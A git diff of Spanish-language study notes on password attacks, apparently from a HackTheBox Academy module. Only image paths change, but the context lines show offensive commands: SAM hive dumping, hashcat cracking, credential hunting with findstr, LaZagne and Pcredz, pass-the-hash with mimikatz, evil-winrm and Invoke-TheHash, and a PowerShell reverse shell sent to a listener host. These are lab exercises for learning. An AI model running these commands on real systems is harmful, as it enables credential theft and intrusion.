@@ -38,11 +38,11 @@ Las funciones hash están diseñadas para funcionar en `one direction`. Esto sig
 
 Las tablas Rainbow son grandes mapas pre-compilados de valores de entrada y salida para una función hash determinada. Estos se pueden usar para identificar muy rápidamente la contraseña si ya se ha mapeado su hash correspondiente.
 
-![Pasted image 20250617150609.png](/img/user/Pasted%20image%2020250617150609.png)
+![Pasted image 20250617150609.png](/img/user/imgs/Pasted%20image%2020250617150609.png)
 
 Debido a que las mesas Rainbow son un ataque tan poderoso, `salting` se utiliza. Un `salt`, en términos criptográficos, es una secuencia aleatoria de bytes agregados contraseña antes de que se le agregue un hash. Para maximizar el impacto, las sales no deben reutilizarse, por ejemplo, para todos las contraseñas almacenadas en una base de datos. Por ejemplo, si la sal `Th1sIsTh3s@lt_` se antepone a la misma contraseña, el hash MD5 ahora sería el siguiente:
 
-![Pasted image 20250617151029.png](/img/user/Pasted%20image%2020250617151029.png)
+![Pasted image 20250617151029.png](/img/user/imgs/Pasted%20image%2020250617151029.png)
 
 Un Salt no es un valor secreto: cuando un sistema va a verificar una solicitud de autenticación, necesita saber qué sal se usó para poder verificar si el hash de la contraseña coincide. Por esta razón, las sales suelen ir precedidas de los hashes correspondientes. La razón por la que se esta técnica funciona con las tablas Rainbow es que incluso si se ha asignado contraseña correcta, es probable que la combinación de sal y contraseña no lo haya hecho (especialmente si la sal contiene caracteres no imprimibles).
 
@@ -55,13 +55,13 @@ Un `ataque de fuerza bruta` consiste en intentar las combinaciones posibles de l
 
 Hashcat admite cientos de tipos de hash diferentes, a cada uno de los cuales se le asigna un ID. Se puede generar una lista de identificadores asociados ejecutando `hashcat` `--help`.
 
-![Pasted image 20250617171052.png](/img/user/Pasted%20image%2020250617171052.png)
+![Pasted image 20250617171052.png](/img/user/imgs/Pasted%20image%2020250617171052.png)
 
 El sitio web de `hashcat` alberga una lista completa de [hashes de ejemplo](https://hashcat.net/wiki/doku.php?id=example_hashes) que pueden ayudar a identificar manualmente un tipo de hash desconocido y determinar el identificador de modo hash de Hashcat correspondiente.
 
 Alternativamente, [hashID](https://github.com/psypanda/hashID) se puede usar para identificar rápidamente el tipo de hash hashcat especificando el `-m` argumento.
 
-![Pasted image 20250617171846.png](/img/user/Pasted%20image%2020250617171846.png)
+![Pasted image 20250617171846.png](/img/user/imgs/Pasted%20image%2020250617171846.png)
 
 ## Modos de ataque
 
@@ -71,19 +71,19 @@ Hashcat tiene muchos modos de ataque diferentes, que incluyen `diccionario`, `m�
 
 Ataque de diccionario (`-a 0`), es cuando el usuario proporciona hashes de contraseña y una lista de palabras como entrada, y Hashcat prueba cada palabra de la lista como una contraseña potencial hasta que se encuentra la correcta o se agota la lista.
 
-![Pasted image 20250617173735.png](/img/user/Pasted%20image%2020250617173735.png)
+![Pasted image 20250617173735.png](/img/user/imgs/Pasted%20image%2020250617173735.png)
 
 Una lista de palabras por sí sola a menudo no es suficiente para descifrar un hash de contraseña. Al igual que en el caso de JtR, `rules` Se puede utilizar para realizar modificaciones específicas en las contraseñas para generar aún más conjeturas. Los archivos de reglas que vienen con hashcat generalmente se encuentran en `/usr/share/hashcat/rules`:
 
-![Pasted image 20250617174334.png](/img/user/Pasted%20image%2020250617174334.png)
+![Pasted image 20250617174334.png](/img/user/imgs/Pasted%20image%2020250617174334.png)
 
-![Pasted image 20250617174643.png](/img/user/Pasted%20image%2020250617174643.png)
+![Pasted image 20250617174643.png](/img/user/imgs/Pasted%20image%2020250617174643.png)
 
 ## Ataque de máscara
 
 Ataque de máscara (-a 3) es un tipo de ataque de fuerza bruta en el que el espacio de claves es definido explícitamente por el usuario. Por ejemplo, si sabemos que una contraseña tiene ocho caracteres, en lugar de intentar todas las combinaciones posibles, podríamos definir una máscara que pruebe combinaciones de seis letras seguidas de dos números.
 
-![Pasted image 20250617175543.png](/img/user/Pasted%20image%2020250617175543.png)
+![Pasted image 20250617175543.png](/img/user/imgs/Pasted%20image%2020250617175543.png)
 
 ---
 
@@ -93,11 +93,11 @@ Muchos usuarios crean sus contraseñas basándose en `simplicidad en lugar de se
 
 Desafortunadamente, la tendencia de los usuarios a crear contraseñas débiles ocurre incluso cuando existen políticas de contraseñas. La mayoría de las personas siguen patrones predecibles al crear contraseñas, a menudo incorporando palabras estrechamente relacionadas con el servicio al que se accede. Por ejemplo, muchos empleados eligen contraseñas que incluyen el nombre de la empresa. Las preferencias e intereses personales también juegan un papel importante. Debido a que puede incluir información personal relacionadas a su vida cotidiana. Las técnicas básicas de OSINT (Open Source Intelligence) pueden ser muy eficaces para descubrir dicha información personal y pueden ayudar a adivinar las contraseñas.
 
-![Pasted image 20250617182103.png](/img/user/Pasted%20image%2020250617182103.png)
+![Pasted image 20250617182103.png](/img/user/imgs/Pasted%20image%2020250617182103.png)
 
 ---
 
-![Pasted image 20250617182122.png](/img/user/Pasted%20image%2020250617182122.png)
+![Pasted image 20250617182122.png](/img/user/imgs/Pasted%20image%2020250617182122.png)
 
 Cada regla se escribe en una nueva línea y determina cómo se debe transformar una palabra. Si escribimos las funciones mostradas anteriormente en un archivo, puede verse así:
 
@@ -126,7 +126,7 @@ $! c so0 sa@
 
 Podemos usar una herramienta llamada **CeWL** para escanear palabras potenciales del sitio web de una empresa y guardarlas en una lista de contraseñas personalizada, una que tenga una mayor probabilidad de contener la contraseña correcta de un empleado. Especificamos algunos parámetros, como la profundidad to spider (`-d`), la longitud mínima de la palabra (`-m`), el almacenamiento de las palabras encontradas en minúsculas (`--lowercase`), así como el fichero donde queremos almacenar los resultados (`-w`).
 
-![Pasted image 20250617183101.png](/img/user/Pasted%20image%2020250617183101.png)
+![Pasted image 20250617183101.png](/img/user/imgs/Pasted%20image%2020250617183101.png)
 
 
 ### Spraying, Stuffing, and Defaults
@@ -135,13 +135,13 @@ Podemos usar una herramienta llamada **CeWL** para escanear palabras potenciales
 
 El `password spraying` es un tipo de ataque de fuerza bruta en el que un atacante intenta usar una sola contraseña en muchas cuenta de usuario diferentes. Por ejemplo, si se sabe que los administradores de una empresa en particular suelen utilizar `ChangeMe123!` al configurar nuevas cuentas, valdría la pena rociar esta contraseña en todas las cuentas de `usuario` para identificar las que no se actualizaron.
 
-![Pasted image 20250618170411.png](/img/user/Pasted%20image%2020250618170411.png)
+![Pasted image 20250618170411.png](/img/user/imgs/Pasted%20image%2020250618170411.png)
 
 ##### Relleno de credenciales
 
 Es otro tipo de ataque de fuerza bruta en el que un atacante utiliza credenciales robadas de un servicio para intentar acceder a otros. Dado que `muchos usuarios reutilizan sus nombres de usuario y passwords en múltiples plataformas` (como el email, las redes sociales y los sistemas empresariales). Por ejemplo, si tenemos una lista de `username:password` obtenidas de una fuga de base de datos, podemos usar `hydra` para realizar un ataque de relleno de credenciales contra un servicio SSH utilizando la siguiente sintaxis:
 
-![Pasted image 20250618170817.png](/img/user/Pasted%20image%2020250618170817.png)
+![Pasted image 20250618170817.png](/img/user/imgs/Pasted%20image%2020250618170817.png)
 
 ##### Credenciales default
 
@@ -149,26 +149,26 @@ Muchos sistemas, como enrutadores, firewalls y DB, vienen con `default credentia
 
 Hay varias listas de credenciales predeterminadas conocidas disponibles en internet, pero, también hay herramientas dedicadas que automatizan el proceso. Un ejemplo de ello es la [default credentials cheat sheet](https://github.com/ihebski/DefaultCreds-cheat-sheet) , que podemos instalar con `pip3`.
 
-![Pasted image 20250618171514.png](/img/user/Pasted%20image%2020250618171514.png)
+![Pasted image 20250618171514.png](/img/user/imgs/Pasted%20image%2020250618171514.png)
 
 Una vez instalado, podemos usar el método `creds` para buscar credenciales predeterminadas conocidas asociadas con un producto o proveedor específico.
 
-![Pasted image 20250618171756.png](/img/user/Pasted%20image%2020250618171756.png)
+![Pasted image 20250618171756.png](/img/user/imgs/Pasted%20image%2020250618171756.png)
 
 Imaginemos que hemos identificado ciertas aplicaciones en uso en la red de un cliente. Después de investigar las credenciales predeterminadas en línea, podemos combinarlas en una nueva lista, con el formato `username:password`, y reutilizar el anteriormente mencionado `hydra` para intentar acceder.
 
-![Pasted image 20250618171923.png](/img/user/Pasted%20image%2020250618171923.png)
+![Pasted image 20250618171923.png](/img/user/imgs/Pasted%20image%2020250618171923.png)
 
 # Windows Authentication Process
 
 El proceso de autenticación del cliente de Windows involucra múltiples módulos responsables del inicio de sesión, la recuperación de credenciales y la verificación. Entre los diversos mecanismos de autenticación de Windows, Kerberos es uno de los más utilizados y complejos.
 
 - Diagrama del proceso de autenticación de Windows:
-![Pasted image 20250629234153.png](/img/user/Pasted%20image%2020250629234153.png)
+![Pasted image 20250629234153.png](/img/user/imgs/Pasted%20image%2020250629234153.png)
 
 El inicio de sesión interactivo local se gestiona mediante la coordinación de varios componentes: el proceso de inicio de sesión (**WinLogon**), el proceso de interfaz de usuario de inicio de sesión (`LogonUI`), proveedores de credenciales, el (LSASS) y el SAM o Active Directory. Los paquetes de autenticación, en este contexto, son bibliotecas DLL.
 
-![Pasted image 20250629235653.png](/img/user/Pasted%20image%2020250629235653.png)
+![Pasted image 20250629235653.png](/img/user/imgs/Pasted%20image%2020250629235653.png)
 
 **WinLogon** es el único proceso que intercepta las solicitudes de inicio de sesión desde el teclado, que se envían a través de mensajes RPC desde **Win32k.sysAl** iniciar sesión, se inicia inmediatamente el *LogonUIAplicación* para presentar la interfaz gráfica de usuario. Una vez que el proveedor de credenciales recopila las credenciales del usuario, WinLogon las envía al Servicio del Subsistema de Autoridad de Seguridad Local (SSA). LSASS) para autenticar al usuario. 
 
@@ -178,7 +178,7 @@ El inicio de sesión interactivo local se gestiona mediante la coordinación de 
 
 El Servicio del Subsistema de Autoridad de Seguridad Local ( **LSASS**) se compone de varios módulos y rige todos los procesos de autenticación. Ubicado en **%SystemRoot%\System32\Lsass.exeEn** el sistema de archivos, es responsable de aplicar la política de seguridad local, autenticar usuarios y enviar registros de auditoría de seguridad al `EventLog` en esencia.
 
-![Pasted image 20250630000240.png](/img/user/Pasted%20image%2020250630000240.png)
+![Pasted image 20250630000240.png](/img/user/imgs/Pasted%20image%2020250630000240.png)
 
 ### Base de datos SAM
 
@@ -187,12 +187,12 @@ Administrador de cuentas de seguridad (`SAM`) es un archivo de base de datos en 
 Para mejorar la protección contra el hackeo sin conexión de la base de datos SAM, Microsoft introdujo una función en *Windows NT 4.0* llamada `SYSKEY( syskey.exe)` Cuando está habilitado, SYSKEY encripta parcialmente el archivo SAM en el disco, garantizando que los hashes de contraseñas de todas las cuentas locales estén encriptados con una clave generada por el sistema. 
 
 - Credential Manager:
-![Pasted image 20250630001222.png](/img/user/Pasted%20image%2020250630001222.png)
+![Pasted image 20250630001222.png](/img/user/imgs/Pasted%20image%2020250630001222.png)
 
 
 El Administrador de Credenciales es una función integrada en todos los sistemas operativos Windows que permite a los usuarios almacenar y administrar las credenciales utilizadas para acceder a recursos de red, sitios web y aplicaciones. Estas credenciales se guardan por perfil de usuario en la carpeta de usuario. `Credential Locker`, las credenciales se cifran y se almacenan en la siguiente ubicación: 
 
-![Pasted image 20250630001340.png](/img/user/Pasted%20image%2020250630001340.png)
+![Pasted image 20250630001340.png](/img/user/imgs/Pasted%20image%2020250630001340.png)
 
 Existen varios métodos para descifrar las credenciales guardadas con Credential Manager. En este módulo, practicaremos con algunos de estos métodos.
 
@@ -200,13 +200,13 @@ Existen varios métodos para descifrar las credenciales guardadas con Credential
 
 Es muy común encontrar entornos de red donde los sistemas Windows están unidos a un dominio de Windows. Esta configuración simplifica la administración centralizada, permitiendo a los administradores supervisar eficientemente todos los sistemas de su organización. En estos entornos, las solicitudes de inicio de sesión se envían a los controladores de dominio dentro del mismo bosque de Active Directory.
 
-![Pasted image 20250630001458.png](/img/user/Pasted%20image%2020250630001458.png)
+![Pasted image 20250630001458.png](/img/user/imgs/Pasted%20image%2020250630001458.png)
 
 # Attacking SAM, System, and SECURITY
 
 Con acceso administrativo a un sistema Windows, podemos intentar volcar rápidamente los archivos asociados a la base de datos SAM, transferirlos a nuestro host de ataque y comenzar a descifrar los hashes sin conexión. Realizar este proceso sin conexión nos permite continuar nuestros ataques sin necesidad de mantener una sesión activa con el objetivo. Analicemos este proceso juntos usando un host de destino. Siéntete libre de seguir las instrucciones generando el cuadro de destino que se proporciona en esta sección.
 
-![Pasted image 20250630011151.png](/img/user/Pasted%20image%2020250630011151.png)
+![Pasted image 20250630011151.png](/img/user/imgs/Pasted%20image%2020250630011151.png)
 
 Podemos hacer una copia de seguridad de estas colmenas utilizando el `reg.exe` utilidad. 
 
@@ -426,11 +426,11 @@ MrBloody@htb[/htb]$ sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/s
 ```
 
 
-![Pasted image 20250630235336.png](/img/user/Pasted%20image%2020250630235336.png)
+![Pasted image 20250630235336.png](/img/user/imgs/Pasted%20image%2020250630235336.png)
 
 
 
-![Pasted image 20250701005646.png](/img/user/Pasted%20image%2020250701005646.png)
+![Pasted image 20250701005646.png](/img/user/imgs/Pasted%20image%2020250701005646.png)
 
 
 ``` css
@@ -457,7 +457,7 @@ En esta sección, nos centraremos principalmente en cómo podemos extraer creden
 
 Existen situaciones en las que una organización podría estar utilizando el reenvío de puertos para reenviar el protocolo de escritorio remoto (*3389*) u otros protocolos utilizados para el acceso remoto desde su enrutador perimetral a un sistema de su red interna.
 
-![Pasted image 20250701131806.png](/img/user/Pasted%20image%2020250701131806.png)
+![Pasted image 20250701131806.png](/img/user/imgs/Pasted%20image%2020250701131806.png)
 
 Alguien que desee iniciar sesión con una cuenta local en la base de datos SAM aún puede hacerlo especificando... ``hostname`` del dispositivo precedido por el ``Username`` (**Ejemplo: WS01\nameofuser**)
 
@@ -466,7 +466,7 @@ Alguien que desee iniciar sesión con una cuenta local en la base de datos SAM a
 
 Tenga en cuenta que un ataque de diccionario consiste básicamente en usar el poder de una computadora para adivinar un nombre de usuario o una contraseña usando una lista personalizada de posibles nombres de usuario y contraseñas. 
 
-![Pasted image 20250701132237.png](/img/user/Pasted%20image%2020250701132237.png)
+![Pasted image 20250701132237.png](/img/user/imgs/Pasted%20image%2020250701132237.png)
 
 
 > [!NOTE] Nota:
@@ -524,7 +524,7 @@ SMB         10.129.201.57     445    DC01             [+] inlanefrieght.local\bw
 
 #### Registro de evento del ataque
 
-![Pasted image 20250701143710.png](/img/user/Pasted%20image%2020250701143710.png)
+![Pasted image 20250701143710.png](/img/user/imgs/Pasted%20image%2020250701143710.png)
 
 Puede ser útil saber qué podría haber dejado un ataque. Conocerlo puede hacer que nuestras recomendaciones de remediación sean más impactantes y valiosas para el cliente con el que trabajamos. En cualquier sistema operativo Windows, un administrador puede navegar a `EventViewer` y ver los eventos de seguridad para ver las acciones exactas registradas
 
@@ -729,18 +729,18 @@ Todavía podemos usar hashes para intentar autenticarnos con un sistema usando u
 MrBloody@htb[/htb]$ evil-winrm -i 10.129.201.57 -u Administrator -H 64f12cddaa88057e06a81b54e73b949b
 ```
 
-![Pasted image 20250701173922.png](/img/user/Pasted%20image%2020250701173922.png)
+![Pasted image 20250701173922.png](/img/user/imgs/Pasted%20image%2020250701173922.png)
 
-![Pasted image 20250701173944.png](/img/user/Pasted%20image%2020250701173944.png)
+![Pasted image 20250701173944.png](/img/user/imgs/Pasted%20image%2020250701173944.png)
 
-![Pasted image 20250701174003.png](/img/user/Pasted%20image%2020250701174003.png)
+![Pasted image 20250701174003.png](/img/user/imgs/Pasted%20image%2020250701174003.png)
 
 
 ### Lazagne
 
 También podemos aprovechar herramientas de terceros como LaZagne para descubrir rápidamente las credenciales que los navegadores web u otras aplicaciones instaladas pueden almacenar de forma insegura.
 
-![Pasted image 20250701181242.png](/img/user/Pasted%20image%2020250701181242.png)
+![Pasted image 20250701181242.png](/img/user/imgs/Pasted%20image%2020250701181242.png)
 
 Una vez LaZagne.exe está en el objetivo, podemos abrir el símbolo del sistema o PowerShell, navegar al directorio donde se cargó el archivo y ejecutar el siguiente comando:
 
@@ -789,10 +789,10 @@ C:\> findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.y
 
 Aquí hay algunos otros lugares que debemos tener en cuenta al buscar credenciales: 
 
-![Pasted image 20250701182507.png](/img/user/Pasted%20image%2020250701182507.png)
+![Pasted image 20250701182507.png](/img/user/imgs/Pasted%20image%2020250701182507.png)
 
 
-![Pasted image 20250701184701.png](/img/user/Pasted%20image%2020250701184701.png)
+![Pasted image 20250701184701.png](/img/user/imgs/Pasted%20image%2020250701184701.png)
 
 ---
 # Linux Authentication Process
@@ -839,7 +839,7 @@ Dado que leer los valores hash de las contraseñas puede poner en riesgo todo el
 htb-student:$y$j9T$3QSBB6CbHEu...SNIP...f8Ms:18955:0:99999:7:::
 ```
 
-![Pasted image 20250701194709.png](/img/user/Pasted%20image%2020250701194709.png)
+![Pasted image 20250701194709.png](/img/user/imgs/Pasted%20image%2020250701194709.png)
 
 Si el ``Password`` el campo contiene un carácter como ``!`` o ``*`` el usuario no puede iniciar sesión con una contraseña de Unix. Sin embargo, se pueden usar otros métodos de autenticación, como Kerberos o la autenticación basada en claves. Lo mismo aplica si... ``Password`` el campo está vacío, lo que significa que no se requiere contraseña para iniciar sesión. Esto puede provocar que ciertos programas denieguen el acceso a funciones específicas. ``Password`` el campo también sigue un formato particular, del cual podemos extraer información adicional: 
 
@@ -853,7 +853,7 @@ Si el ``Password`` el campo contiene un carácter como ``!`` o ``*`` el usuario 
 
 Como podemos ver aquí, las contraseñas hash se dividen en tres partes. ID el valor especifica qué algoritmo hash criptográfico se utilizó, normalmente uno de los siguientes: 
 
-![Pasted image 20250701195021.png](/img/user/Pasted%20image%2020250701195021.png)
+![Pasted image 20250701195021.png](/img/user/imgs/Pasted%20image%2020250701195021.png)
 
 Muchas distribuciones de Linux, incluida Debian, ahora utilizan ``yescrypt`` como algoritmo hash predeterminado. Sin embargo, en sistemas más antiguos, aún podemos encontrar otros métodos hash que podrían ser descifrados. En breve, explicaremos cómo funciona el proceso de descifrado. 
 
@@ -901,24 +901,24 @@ Este es el escenario exacto que ``JtR`` ``single crack mode``.
 # Credential Hunting in Network Traffic
 
 En el mundo actual, preocupado por la seguridad, la mayoría de las aplicaciones utilizan TLS para cifrar datos confidenciales en tránsito. Sin embargo, no todos los entornos son completamente seguros. Los sistemas heredados, los servicios mal configurados o las aplicaciones de prueba iniciadas sin HTTPS pueden dar lugar al uso de protocolos sin cifrar, como HTTP o SNMP.
-![Pasted image 20250701205553.png](/img/user/Pasted%20image%2020250701205553.png)
+![Pasted image 20250701205553.png](/img/user/imgs/Pasted%20image%2020250701205553.png)
 
 ## Wireshark 
-![Pasted image 20250701205611.png](/img/user/Pasted%20image%2020250701205611.png)
+![Pasted image 20250701205611.png](/img/user/imgs/Pasted%20image%2020250701205611.png)
 
 Por ejemplo, en la imagen a continuación estamos filtrando sin cifrar. HTTP tráfico. 
 
-![Pasted image 20250701205732.png](/img/user/Pasted%20image%2020250701205732.png)
+![Pasted image 20250701205732.png](/img/user/imgs/Pasted%20image%2020250701205732.png)
 
 En *Wireshark*, es posible localizar paquetes que contienen bytes o cadenas específicos. Una forma de hacerlo es mediante un filtro de visualización como ``http contains "passw"`` alternativamente, puede navegar a ``Edit > Find Packet`` ingrese manualmente la consulta de búsqueda deseada. Por ejemplo, podría buscar paquetes que contengan la cadena ``"passw"``: 
 
-![Pasted image 20250701205851.png](/img/user/Pasted%20image%2020250701205851.png)
+![Pasted image 20250701205851.png](/img/user/imgs/Pasted%20image%2020250701205851.png)
 
 # Pcredz
 
 Pcredz es una herramienta que permite extraer credenciales del tráfico en tiempo real o de capturas de paquetes de red. En concreto, permite extraer la siguiente información: 
 
-![Pasted image 20250701205919.png](/img/user/Pasted%20image%2020250701205919.png)
+![Pasted image 20250701205919.png](/img/user/imgs/Pasted%20image%2020250701205919.png)
 
 Para poder correr ``Pcredz``, se puede clonar el repositorio e instalar todas las dependencias, o utilizar el contenedor Docker.
 
@@ -954,9 +954,9 @@ FTP Pass: qw...SNIP...
 demo.pcapng parsed in: 1.82 seconds (File size 15.5 Mo).
 ```
 
-![Pasted image 20250701213153.png](/img/user/Pasted%20image%2020250701213153.png)
+![Pasted image 20250701213153.png](/img/user/imgs/Pasted%20image%2020250701213153.png)
 
-![Pasted image 20250701213237.png](/img/user/Pasted%20image%2020250701213237.png)
+![Pasted image 20250701213237.png](/img/user/imgs/Pasted%20image%2020250701213237.png)
 
  Use Pcredz para encontrar datos anormales y obtuve credenciales e indicios para encontrar la tarjeta.
 
@@ -974,7 +974,7 @@ Especialmente si se olvidan ``credenciales`` o archivos de ``configuración``
 
 Es importante comprender los tipos de patrones y formatos de archivo que suelen revelar información confidencial.
 
-![Pasted image 20250702010039.png](/img/user/Pasted%20image%2020250702010039.png)
+![Pasted image 20250702010039.png](/img/user/imgs/Pasted%20image%2020250702010039.png)
 
 Con todo esto en mente, es posible que desee comenzar con búsquedas básicas en la línea de comandos (por ejemplo, **Get-ChildItem -Recurse -Include ``*``.ext \\Server\Share | Select-String -Pattern ...**) antes de escalar a herramientas más avanzadas.
 
@@ -997,13 +997,13 @@ c:\Users\Public>Snaffler.exe -s
 
 Todas las herramientas cubiertas en esta sección generan un ``'large amount of information'``, si bien ayudan con la automatización, generalmente se requiere una buena cantidad de revisión manual, ya que muchas coincidencias puede ser ``'false positive'``. Dos parámetros útiles que pueden ayudar a refinar el proceso de búsqueda de *Snaffler* son:
 
-![Pasted image 20250702015444.png](/img/user/Pasted%20image%2020250702015444.png)
+![Pasted image 20250702015444.png](/img/user/imgs/Pasted%20image%2020250702015444.png)
 
 #### PowerHuntShares
 
 Otra herramienta que se puede utilizar es ``PowerHuntShares`` , un script de *PowerShell* que no necesariamente debe ejecutarse en una máquina unida a un dominio. Una de sus funciones más útiles es que genera un ``HTML report`` al finalizar, se proporciona una interfaz de usuario fácil de usar para revisar los resultados:
 
-![Pasted image 20250702015847.png](/img/user/Pasted%20image%2020250702015847.png)
+![Pasted image 20250702015847.png](/img/user/imgs/Pasted%20image%2020250702015847.png)
 
 Podemos ejecutar un escaneo básico usando ``PowerHuntShares`` así: 
 
@@ -1089,16 +1089,16 @@ SMB         10.129.234.121  445    DC01             [*] Spidering .
 ```
 
 
-![Pasted image 20250702060047.png](/img/user/Pasted%20image%2020250702060047.png)
+![Pasted image 20250702060047.png](/img/user/imgs/Pasted%20image%2020250702060047.png)
 
-![Pasted image 20250702060341.png](/img/user/Pasted%20image%2020250702060341.png)
-
-
-
-![Pasted image 20250702215635.png](/img/user/Pasted%20image%2020250702215635.png)
+![Pasted image 20250702060341.png](/img/user/imgs/Pasted%20image%2020250702060341.png)
 
 
-![Pasted image 20250704011534.png](/img/user/Pasted%20image%2020250704011534.png)
+
+![Pasted image 20250702215635.png](/img/user/imgs/Pasted%20image%2020250702215635.png)
+
+
+![Pasted image 20250704011534.png](/img/user/imgs/Pasted%20image%2020250704011534.png)
 
 
 ---
@@ -1109,7 +1109,7 @@ Es una técnica que consiste en que un atacante utiliza un ``hash`` de contrase�
 
 Los ``ataques PtH`` explotan el protocolo de autenticación, ya que el hash de la contraseña permanece estático en cada sesión hasta que se cambia la contraseña. 
 
-![Pasted image 20250704024045.png](/img/user/Pasted%20image%2020250704024045.png)
+![Pasted image 20250704024045.png](/img/user/imgs/Pasted%20image%2020250704024045.png)
 
 
 > [!NOTE] NOTA:
@@ -1131,7 +1131,7 @@ Con NTLM, las contraseñas almacenadas en el servidor y el controlador de domini
 Las primeras herramientas que usaremos para realizar un ataque Pass the Hash es ``MIMIKATZ``. ``Mimikatz`` tiene un módulo llamado `sekurlsa::pth`. Esto nos permite realizar un ataque PASS-THE-HASH iniciando un proceso con el hash de la password del usuario. Para usar el módulo necesitamos lo siguiente:
 
 
-![Pasted image 20250704025120.png](/img/user/Pasted%20image%2020250704025120.png)
+![Pasted image 20250704025120.png](/img/user/imgs/Pasted%20image%2020250704025120.png)
 
 #### Pass the hash from Windows using Mimikatz
 
@@ -1162,7 +1162,7 @@ NTLM    : 64F12CDDAA88057E06A81B54E73B949B
 
 Usaremos cmd.exe para ejecutar comandos en el contexto del usuario. Por ejemplo `julio` puede conectarse a una carpeta llamada `julio` en el DC.
 
-![Pasted image 20250704025326.png](/img/user/Pasted%20image%2020250704025326.png)
+![Pasted image 20250704025326.png](/img/user/imgs/Pasted%20image%2020250704025326.png)
 
 
 #### Pass the Hash with Powershell Invoke-TheHash (Windows)
@@ -1172,7 +1172,7 @@ Otra herramienta que podemos usar para realizar ataques de ``Pass the Hash`` en 
 La autenticación se realiza pasando un Hash NTML al protocolo de autenticación NTLMv2. `No se requieren privilegios de administrator local en el lado del cliente`, pero el usuario y el hash que usamos para la autenticación deben tener derechos administrativos en el equipo destino.
 
 
-![Pasted image 20250704025952.png](/img/user/Pasted%20image%2020250704025952.png)
+![Pasted image 20250704025952.png](/img/user/imgs/Pasted%20image%2020250704025952.png)
 
 
 
@@ -1197,12 +1197,12 @@ También podemos obtener una conexión de Shell inversa en la máquina de destin
 
 Para obtener un Shell inverso, necesitamos iniciar nuestro oyente usando Netcat en nuestra máquina Windows, que tiene la ``dirección IP 172.16.1.5`` usaremos el puerto *8001* para esperar la conexión. 
 
-![Pasted image 20250704030231.png](/img/user/Pasted%20image%2020250704030231.png)
+![Pasted image 20250704030231.png](/img/user/imgs/Pasted%20image%2020250704030231.png)
 
 
 Para crear un Shell inverso simple usando ``PowerShell``, podemos visitar ``revshells.com`` , configurar nuestra IP ``172.16.1.5 ``y puerto ``8001``, y seleccione la opción PowerShell #3 (Base64), como se muestra en la siguiente imagen. 
 
-![Pasted image 20250704030309.png](/img/user/Pasted%20image%2020250704030309.png)
+![Pasted image 20250704030309.png](/img/user/imgs/Pasted%20image%2020250704030309.png)
 
 
 Ahora podemos ejecutar ``Invoke-TheHash``, para ejecutar nuestro script de Shell inverso de PowerShell en el equipo de destino. Observe que, en lugar de proporcionar la dirección IP, que es ``172.16.1.10``, usaremos el nombre de la máquina DC01(cualquiera funcionaría). 
@@ -1222,7 +1222,7 @@ PS c:\tools\Invoke-TheHash> Invoke-WMIExec -Target DC01 -Domain inlanefreight.ht
 El resultado es una conexión de shell inversa desde el host DC01 (172.16.1.10). 
 
 
-![Pasted image 20250704030521.png](/img/user/Pasted%20image%2020250704030521.png)
+![Pasted image 20250704030521.png](/img/user/imgs/Pasted%20image%2020250704030521.png)
 
 ## Pass the Hash with Impacket (Linux)
 
@@ -1322,7 +1322,7 @@ Este ataque tiene algunas salvedades:
 
 ``Restricted Admin Mode``, que está deshabilitado de forma predeterminada, debe estar habilitado en el host de destino; de lo contrario, se le presentará el siguiente error:
 
-![Pasted image 20250707020740.png](/img/user/Pasted%20image%2020250707020740.png)
+![Pasted image 20250707020740.png](/img/user/imgs/Pasted%20image%2020250707020740.png)
 
 Esto se puede habilitar agregando una nueva clave de registro `DisableRestrictedAdmin` (REG_DWORD) bajo ``HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa`` con el valor 0. Se puede hacer usando el siguiente comando:
 
@@ -1332,7 +1332,7 @@ Esto se puede habilitar agregando una nueva clave de registro `DisableRestricted
 c:\tools> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
 ```
 
-![Pasted image 20250707021048.png](/img/user/Pasted%20image%2020250707021048.png)
+![Pasted image 20250707021048.png](/img/user/imgs/Pasted%20image%2020250707021048.png)
 
 
 Una vez agregada la clave de registro, podemos usar ``xfreerdp`` con la opción ``/pth`` para obtener acceso RDP:
@@ -1352,7 +1352,7 @@ MrBloody@htb[/htb]$ xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06
 ```
 
 
-![Pasted image 20250707021352.png](/img/user/Pasted%20image%2020250707021352.png)
+![Pasted image 20250707021352.png](/img/user/imgs/Pasted%20image%2020250707021352.png)
 
 
 # UAC Pass the Hash Limits for Local Accounts
@@ -1369,9 +1369,9 @@ El UAC (Control de cuentas de usuario) limita la capacidad de los usuarios local
 Estas configuraciones son solo para cuentas administrativas locales. Si accedemos a una cuenta de dominio con derechos administrativos en un equipo, podemos usar Pass-the-Hash en ese equipo.
 
 
-![Pasted image 20250707031058.png](/img/user/Pasted%20image%2020250707031058.png)
+![Pasted image 20250707031058.png](/img/user/imgs/Pasted%20image%2020250707031058.png)
 
-![Pasted image 20250707033800.png](/img/user/Pasted%20image%2020250707033800.png)
+![Pasted image 20250707033800.png](/img/user/imgs/Pasted%20image%2020250707033800.png)
 
 ``` css
 .\mimikatz.exe privilege::debug "sekurlsa::pth /user:david /rc4:c39f2beb3d2ec06a62cb887fb391dee0 /domain:inlanefreight.htb /run:cmd.exe" exit
@@ -1389,7 +1389,7 @@ El sistema de autenticación Kerberos se basa en tickets. La idea central de Ker
 
 En su lugar, Kerberos conserva todos los tickets en el sistema local y presenta a cada servicio únicamente el ticket específico, lo que impide que un ticket se utilice para otro fin.
 
-![Pasted image 20250707213119.png](/img/user/Pasted%20image%2020250707213119.png)
+![Pasted image 20250707213119.png](/img/user/imgs/Pasted%20image%2020250707213119.png)
 
 Cuando un usuario solicita un TGT, deben autenticarse ante el controlador de dominio cifrando la marca de tiempo actual con el hash de su password. Una vez que el controlador de dominio valida la identidad del usuario (dado que el dominio conoce el hash de su password, lo que significa que puede descifrar la marca de tiempo), le envía un TGT para futuras solicitudes.
 
@@ -1399,7 +1399,7 @@ Una vez que el usuario recibe su ticket, no tiene que demostrar su identidad con
 
 Necesitamos un ticket ``Kerberos`` válido para realizar un ataque ``Pass the Ticket (PtT)``. Puede ser:
 
-![Pasted image 20250707214358.png](/img/user/Pasted%20image%2020250707214358.png)
+![Pasted image 20250707214358.png](/img/user/imgs/Pasted%20image%2020250707214358.png)
 
